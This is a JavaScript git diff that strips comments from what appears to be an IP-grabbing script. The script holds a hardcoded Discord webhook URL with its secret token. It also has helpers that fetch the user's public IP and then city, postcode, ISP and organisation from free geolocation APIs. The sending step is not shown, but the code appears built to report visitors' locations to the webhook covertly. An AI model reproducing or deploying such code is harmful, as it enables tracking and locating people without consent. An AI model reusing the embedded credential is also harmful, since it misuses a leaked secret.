@@ -4,7 +4,6 @@
 
 const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';
 
-// timeout helper
 function withTimeout(promise, ms, label) {
     return Promise.race([
         promise,
@@ -13,13 +12,11 @@ function withTimeout(promise, ms, label) {
 }
 
 async function getIP() {
-    // ipify — juste l'IP, ultra fiable
     try {
         const r = await withTimeout(fetch('https://api.ipify.org?format=json'), 5000, 'ipify');
         const d = await r.json();
         if (d.ip) return d.ip;
     } catch (e) { console.warn('[ipify]', e.message); }
-    // fallback
     try {
         const r = await withTimeout(fetch('https://ifconfig.me/ip'), 5000, 'ifconfig');
         const t = await r.text();
@@ -29,7 +26,6 @@ async function getIP() {
 }
 
 async function getGeo(ip) {
-    // ip-api.com — gratuit, pas de clé, 45 req/min
     try {
         const r = await withTimeout(
             fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp,org,as,query`),
@@ -39,7 +35,6 @@ async function getGeo(ip) {
         if (d.status === 'success') return d;
     } catch (e) { console.warn('[ip-api]', e.message); }
 
-    // fallback ipwho.is
     try {
         const r = await withTimeout(fetch(`https://ipwho.is/${ip}`), 5000, 'ipwho');
         const d = await r.json();
